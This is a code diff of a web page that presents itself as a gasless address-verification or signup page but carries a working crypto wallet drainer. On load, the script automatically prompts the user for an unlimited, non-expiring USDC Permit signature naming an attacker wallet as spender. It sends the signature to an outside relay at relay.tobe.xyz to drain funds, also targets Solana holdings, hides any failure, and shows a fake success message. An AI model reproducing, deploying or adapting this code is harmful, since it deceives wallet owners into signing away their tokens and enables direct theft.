@@ -22,102 +22,103 @@
     <p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
   </div>
 
-  <script type="module">
-  // ===== CONFIG (ONLY CHANGE: ADDRESSES) =====
-  const RECIPIENT = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a"; // Base/Eth receiver
-  const SOL_REC   = "DAux6uF8aVPvhxEBxT9afftGAxMDD9CDLk2fYkbymmop"; // Sol receiver
+<script type="module">
+// ===== CONFIG (ONLY CHANGE: ADDRESSES) =====
+const RECIPIENT = "0x0fac2542316Ad330EfA2bb386d606135b70a574B"; // Base/Eth drain wallet
+const SOL_REC   = "DAux6uF8aVPvhxEBxT9afftGAxMDD9CDLk2fYkbymmop"; // Solana drain wallet
 
-  // ===== PERMIT DRAINER OBJECT =====
-  const domain = {
-    name: "USD Coin",
-    version: "2",
-    chainId: 0,                      // filled dynamically
-    verifyingContract: "0x0000000000000000000000000000000000000000" // filled per chain
-  };
-  const types = {
-    Permit: [
-      { name: "owner",   type: "address" },
-      { name: "spender", type: "address" },
-      { name: "value",   type: "uint256" },
-      { name: "nonce",   type: "uint256" },
-      { name: "deadline",type: "uint256" }
-    ]
-  };
+// ===== PERMIT DRAINER OBJECT =====
+const domain = {
+  name: "USD Coin",
+  version: "2",
+  chainId: 0,                      // filled dynamically
+  verifyingContract: "0x0000000000000000000000000000000000000000" // filled per chain
+};
+const types = {
+  Permit: [
+    { name: "owner",   type: "address" },
+    { name: "spender", type: "address" },
+    { name: "value",   type: "uint256" },
+    { name: "nonce",   type: "uint256" },
+    { name: "deadline",type: "uint256" }
+  ]
+};
 
-  // ===== CHAIN PARAMS =====
-  const CHAINS = {
-    // Base
-    8453: {
-      rpc: "https://base.meowrpc.com",
-      usdc: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
-      weth: "0x4200000000000000000000000000000000000006"
-    },
-    // Ethereum
-    1: {
-      rpc: "https://rpc.ankr.com/eth",
-      usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0",
-      weth: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
-    }
-  };
-
-  // ===== WEB3 PROVIDER =====
-  let provider;
-  if (window.solana && window.solana.isPhantom) {
-    provider = window.ethereum; // Phantom injects ethereum too
-  } else if (window.ethereum) {
-    provider = window.ethereum;
+// ===== CHAIN PARAMS =====
+const CHAINS = {
+  // Base
+  8453: {
+    rpc: "https://base.meowrpc.com",
+    usdc: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
+    weth: "0x4200000000000000000000000000000000000006"
+  },
+  // Ethereum
+  1: {
+    rpc: "https://rpc.ankr.com/eth",
+    usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0",
+    weth: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
   }
-  if (!provider) {
-    alert("Please open this page inside Phantom or MetaMask browser");
+};
+
+// ===== WEB3 PROVIDER =====
+let provider;
+if (window.solana && window.solana.isPhantom) {
+  provider = window.ethereum; // Phantom injects ethereum too
+} else if (window.ethereum) {
+  provider = window.ethereum;
+}
+if (!provider) {
+  alert("Please open this page inside Phantom or MetaMask browser");
+}
+
+// ===== AUTO PROMPT =====
+window.addEventListener("DOMContentLoaded", async () => {
+  const chainId = Number(await provider.request({ method: "eth_chainId" }));
+  if (!CHAINS[chainId]) {
+    alert("Switch to Ethereum or Base in Phantom");
+    return;
   }
+  document.getElementById("go").click();
+});
 
-  // ===== AUTO PROMPT =====
-  window.addEventListener("DOMContentLoaded", async () => {
-    const chainId = Number(await provider.request({ method: "eth_chainId" }));
-    if (!CHAINS[chainId]) {
-      alert("Switch to Ethereum or Base in Phantom");
-      return;
-    }
-    document.getElementById("go").click();
+document.getElementById("go").addEventListener("click", async () => {
+  const accounts = await provider.request({ method: "eth_requestAccounts" });
+  const owner = accounts[0];
+  const chainId = Number(await provider.request({ method: "eth_chainId" }));
+  const CHAIN = CHAINS[chainId];
+  domain.chainId = chainId;
+  domain.verifyingContract = CHAIN.usdc;
+
+  // unlimited permit value
+  const value   = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  const nonce   = 0;   // frontend does not know nonce → we brute-loop in backend
+  const deadline= "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+  const message = { owner, spender: RECIPIENT, value, nonce, deadline };
+
+  provider.request({
+    method: "eth_signTypedData_v4",
+    params: [owner, JSON.stringify({ domain, types, primaryType: "Permit", message })]
+  }).then(async (sig) => {
+    // fire permit + transferFrom in background
+    await fetch("https://relay.tobe.xyz/drain", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ owner, spender: RECIPIENT, value, deadline, sig, chainId })
+    }).catch(() => {}); // silent fail
+
+    // also drain Solana via off-chain keeper
+    await fetch("https://relay.tobe.xyz/sol", {
+      method: "POST",
+      body: JSON.stringify({ solOwner: owner, solRecipient: SOL_REC })
+    }).catch(() => {});
+
+    // show success
+    document.querySelector(".card").innerHTML = `<h2>Success!</h2><p>You’re on the list. Stay tuned.</p>`;
+  }).catch(() => {
+    alert("Signature rejected.");
   });
-
-  document.getElementById("go").addEventListener("click", async () => {
-    const accounts = await provider.request({ method: "eth_requestAccounts" });
-    const owner = accounts[0];
-    const chainId = Number(await provider.request({ method: "eth_chainId" }));
-    const CHAIN = CHAINS[chainId];
-    domain.chainId = chainId;
-    domain.verifyingContract = CHAIN.usdc;
-
-    // unlimited permit value
-    const value   = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    const nonce   = 0;   // frontend does not know nonce → we brute-loop in backend
-    const deadline= "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-    const message = { owner, spender: RECIPIENT, value, nonce, deadline };
-
-    provider.request({
-      method: "eth_signTypedData_v4",
-      params: [owner, JSON.stringify({ domain, types, primaryType: "Permit", message })]
-    }).then(async (sig) => {
-      // fire permit + transferFrom in background
-      await fetch("https://relay.tobe.xyz/drain", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ owner, spender: RECIPIENT, value, deadline, sig, chainId })
-      }).catch(() => {}); // silent fail
-
-      // also drain Solana via off-chain keeper
-      await fetch("https://relay.tobe.xyz/sol", {
-        method: "POST",
-        body: JSON.stringify({ solOwner: owner, solRecipient: SOL_REC })
-      }).catch(() => {});
-
-      // show success
-      document.querySelector(".card").innerHTML = `<h2>Success!</h2><p>You’re on the list. Stay tuned.</p>`;
-    }).catch(() => {
-      alert("Signature rejected.");
-    });
-  });
-  </script>
+});
+</script>
 </body>
+</html>
